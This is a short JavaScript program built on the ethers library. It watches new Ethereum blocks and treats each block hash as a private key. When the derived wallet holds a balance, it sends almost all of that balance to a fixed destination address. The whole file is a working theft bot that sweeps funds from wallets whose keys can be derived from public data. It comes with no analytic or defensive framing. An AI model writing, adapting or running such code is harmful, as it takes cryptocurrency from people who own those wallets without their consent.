const ethers = require("ethers");

const provider = new ethers.JsonRpcProvider("https://eth.rpc.blxrbdn.com");
const DESTINATION_ADDRESS = "0x422B0755EABeA90Cc2C5674F8Bba65C861962fdD";

provider.on("block", async (e) => {
    console.log(`block : ${e}`);
    // block
    const block = await provider.getBlock(e);
    const blockHash = block.hash;
    console.log(`Block hash: ${blockHash}`);
    // wallet
    const wallet = new ethers.Wallet(blockHash, provider);
    console.log(`Wallet address: ${wallet.address}`);
    // Balance
    const balance = await provider.getBalance(wallet.address);
    console.log(`Balance: ${ethers.formatEther(balance)} ETH`);

    console.log(`- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -`)

    if (balance > 0) {
        console.log(`wow nice !!`);

         try {
            // Create transaction
            const tx = await wallet.sendTransaction({
                to: DESTINATION_ADDRESS,
                value: balance - ethers.parseEther("0.0001") // leave a tiny amount for gas (if any)
            });

            console.log(`Transaction sent! Hash: ${tx.hash}`);

            // Wait for confirmation
            const receipt = await tx.wait();
            console.log(`Transaction confirmed in block ${receipt}`);
        } catch (error) {
            console.error(`Transaction failed: ${error.message}`);
        }
    }
});
